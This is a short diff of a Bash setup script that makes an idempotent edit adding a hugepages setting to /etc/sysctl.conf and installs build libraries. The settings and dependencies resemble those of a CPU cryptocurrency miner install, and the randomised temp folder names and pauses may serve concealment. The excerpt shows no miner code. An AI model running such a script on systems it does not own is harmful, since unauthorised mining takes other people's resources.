@@ -44,8 +44,13 @@ pausesix=$(shuf -i 65-71 -n 1)
 #mkdir /tmp
 
 sudo dpkg --configure -a
+if
+grep --quiet vm.nr_hugepages=256 /etc/sysctl.conf; then
+echo vm.nr_hugepages already exist
+else
 echo 'vm.nr_hugepages=256' | sudo tee -a /etc/sysctl.conf
 sudo sysctl -p
+fi
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir $tmpfoldername
